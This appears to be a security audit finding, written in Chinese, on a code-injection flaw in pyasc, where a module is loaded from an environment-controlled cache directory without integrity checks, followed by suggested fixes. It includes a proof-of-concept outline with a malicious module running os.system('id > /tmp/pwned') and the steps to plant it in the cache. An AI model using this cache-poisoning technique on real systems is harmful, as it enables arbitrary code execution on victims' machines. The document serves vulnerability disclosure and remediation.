# VULN-SEC-RT-003：importlib模块加载漏洞

## 漏洞概述

**漏洞类型**: 代码注入  
**CWE**: CWE-94 (Improper Control of Generation of Code)  
**严重程度**: Critical  
**置信度**: 85%

### 影响文件

- **文件**: `python/asc/lib/runtime/state.py`
- **行号**: 110-114
- **函数**: `NPUUtils.__init__`

### 漏洞描述

通过 `importlib` 从缓存路径加载模块时未验证完整性。`NPUUtils` 使用 `importlib.util.spec_from_file_location` 从缓存加载 Python 模块，没有任何完整性验证。加载的模块以完整 Python 权限执行，若缓存被篡改可实现任意代码执行。

---

## 完整攻击链分析

### 数据流追踪

```
[污点源: 环境变量]
PYASC_HOME / PYASC_CACHE_DIR
    ↓
cache.py:22-23 → CacheOptions 初始化
    ↓
state.py:97 → cache_manager = get_cache_manager(key)
    ↓
state.py:99 → utils_lib = cache_manager.get_file(f"lib{utils_name}{suffix}")
    ↓
[返回攻击者控制的模块文件路径]
    ↓
state.py:111 → spec = importlib.util.spec_from_file_location(utils_name, utils_lib)
    ↓
state.py:112 → mod = importlib.util.module_from_spec(spec)
    ↓
state.py:113 → spec.loader.exec_module(mod)
    ↓
[污点汇: Python 模块执行]
    ↓
[恶意 Python 模块中的代码自动执行]
```

### 关键代码片段

```python
# state.py:85-114
class NPUUtils:
    def __init__(self, is_model: bool, soc: config.Platform):
        if is_model:
            return
        
        dirname = os.path.dirname(os.path.realpath(__file__))
        utils_name = "npu_utils"
        src = Path(os.path.join(dirname, f"{utils_name}.cpp")).read_text()
        
        # 计算缓存 key
        key = hashlib.sha256((src + suffix_key + str(is_model)).encode("utf-8")).hexdigest()
        cache_manager = get_cache_manager(key)
        suffix = sysconfig.get_config_var("EXT_SUFFIX")
        utils_lib = cache_manager.get_file(f"lib{utils_name}{suffix}")
        
        # 如果缓存不存在，编译新模块
        if utils_lib is None:
            ...
        
        # 危险: 从缓存路径加载 Python 模块
        import importlib.util
        spec = importlib.util.spec_from_file_location(utils_name, utils_lib)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)  # 执行模块中的所有代码
        
        self.npu_utils_mod = mod
```

---

## PoC 构造思路

### 步骤 1: 创建恶意 Python 模块

恶意模块可以在顶层执行任意代码：

```python
# malicious_npu_utils.py (或 .so 扩展的 Python 模块)

# 顶层代码在 exec_module 时自动执行
import os
os.system("id > /tmp/pwned")

# 提供正常函数以避免后续调用失败
def acl_init():
    return 0

def acl_finalize():
    return 0

def msprof_sys_cycle_time():
    return 1000000

# ... 其他函数
```

### 步骤 2: 控制缓存目录

```bash
export PYASC_CACHE_DIR=/tmp/attacker_cache
```

### 步骤 3: 计算缓存 key 并放置恶意模块

```bash
# 缓存 key 是源代码内容的 SHA256 hash
# 目录结构: <cache_base>/<base32_hash>/libnpu_utils<suffix>

mkdir -p /tmp/attacker_cache/<computed_key>
cp malicious_npu_utils.cpython-39-x86_64-linux-gnu.so /tmp/attacker_cache/<computed_key>/libnpu_utils.cpython-39-x86_64-linux-gnu.so
```

### 步骤 4: 触发加载

```python
import asc
# pyasc 初始化会加载 NPUUtils
# importlib.exec_module() 执行恶意模块中的代码
```

---

## 利用条件分析

| 条件 | 要求 | 说明 |
|------|------|------|
| 攻击者位置 | 本地 | 需要设置环境变量或写入文件 |
| 权限要求 | 用户级 | 环境变量设置不需要特殊权限 |
| 文件写入 | 需要 | 需要写入恶意 Python 模块 |
| key 计算 | 需要 | 需要计算正确的缓存 key |
| 用户交互 | 无 | pyasc 初始化自动触发 |

---

## 影响分析

### 安全影响

1. **任意代码执行**: Python 模块顶层代码自动执行
2. **权限继承**: 以 pyasc 进程权限执行
3. **隐蔽性**: 模块可同时提供正常功能

### 与 pickle 反序列化的对比

| 特性 | importlib 模块加载 | pickle 反序列化 |
|------|---------------------|-----------------|
| 触发时机 | 运行时初始化 | kernel 缓存加载 |
| 代码执行方式 | 模块顶层代码 | __reduce__ 方法 |
| 文件格式 | Python 模块 (.py/.so) | pickle 文件 |
| 隐蔽性 | 更隐蔽（正常模块结构） | 较隐蔽 |

---

## 修复建议

### 优先级 1: 模块签名验证

```python
import hashlib
import hmac

def verify_module_signature(module_path: str, secret_key: bytes) -> bool:
    with open(module_path, 'rb') as f:
        content = f.read()
    
    # 验证 HMAC 签名
    expected_sig = hmac.new(secret_key, content[:-64], hashlib.sha256).hexdigest()
    actual_sig = content[-64:].decode()
    
    return expected_sig == actual_sig

def load_module_with_verification(module_path: str) -> object:
    if not verify_module_signature(module_path, SECRET_KEY):
        raise RuntimeError("Module signature verification failed")
    
    import importlib.util
    spec = importlib.util.spec_from_file_location("module", module_path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod
```

### 优先级 2: 固定模块路径

```python
# 不从缓存加载，使用固定路径
NPU_UTILS_PATH = os.path.join(os.path.dirname(__file__), "npu_utils.so")

def load_npu_utils():
    # 直接加载内置模块
    import importlib.util
    spec = importlib.util.spec_from_file_location("npu_utils", NPU_UTILS_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod
```

### 优先级 3: 模块内容 hash 验证

```python
EXPECTED_MODULE_HASHES = {
    'npu_utils': 'sha256:<expected_hash>',
    'rt_wrapper': 'sha256:<expected_hash>',
}

def verify_module_hash(module_name: str, module_path: str) -> bool:
    expected = EXPECTED_MODULE_HASHES.get(module_name)
    if not expected:
        return False
    
    with open(module_path, 'rb') as f:
        actual_hash = hashlib.sha256(f.read()).hexdigest()
    
    return actual_hash == expected.split(':')[1]
```

### 优先级 4: 安全的缓存策略

```python
# 编译时签名，加载时验证
def build_and_sign_module(source: str, output_path: str):
    # 编译
    compiled = compile_module(source, output_path)
    
    # 签名
    signature = hmac.new(SECRET_KEY, compiled, hashlib.sha256).hexdigest()
    
    # 存储签名文件
    with open(output_path + '.sig', 'w') as f:
        f.write(signature)
    
    return output_path
```

---

## 相关漏洞

- **VULN-lib_runtime-002**: Unsafe Dynamic Module Loading（相同漏洞）
- **VULN-SEC-RT-001**: 动态库加载漏洞（类似攻击向量）
- **VULN-CROSS-001**: 跨模块环境变量攻击链
- **VULN-CROSS-004**: 缓存完整性攻击链